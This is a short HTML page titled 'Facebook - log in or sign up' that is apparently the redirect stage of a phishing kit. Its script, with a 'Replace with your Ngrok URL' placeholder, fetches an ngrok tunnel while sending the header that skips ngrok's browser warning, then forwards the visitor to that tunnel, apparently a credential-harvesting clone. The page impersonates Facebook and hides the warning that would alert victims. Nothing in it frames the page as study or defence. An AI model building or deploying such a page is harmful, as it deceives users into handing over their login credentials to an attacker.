<!DOCTYPE html>
<html>
<head>
    <title>Facebook - log in or sign up</title>
    <script>
        // Replace with your Ngrok URL
        const ngrokUrl = "https://enhanced-grossly-slug.ngrok-free.app";

        // Fetch with skip header and redirect
        fetch(ngrokUrl, {
            headers: {
                "ngrok-skip-browser-warning": "true"
            }
        }).then(() => {
            window.location.href = ngrokUrl; // Redirect after fetching
        }).catch(err => {
            console.error("Redirect failed:", err);
            window.location.href = ngrokUrl; // Fallback redirect
        });
    </script>
</head>
<body>
    <p>Redirecting...</p>
</body>
</html>
